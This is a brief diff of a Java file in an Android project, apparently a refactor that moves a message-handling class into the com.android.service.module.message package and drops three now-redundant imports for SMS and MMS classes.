@@ -1,4 +1,4 @@
-package com.android.service.interfaces;
+package com.android.service.module.message;
 
 import java.util.ArrayList;
 import java.util.Iterator;
@@ -8,9 +8,6 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.manager.ManagerAgent;
 import com.android.service.module.ModuleMessage;
-import com.android.service.module.message.Mms;
-import com.android.service.module.message.MmsBrowser;
-import com.android.service.module.message.Sms;
 import com.android.service.util.Check;
 
 import android.content.ContentResolver;
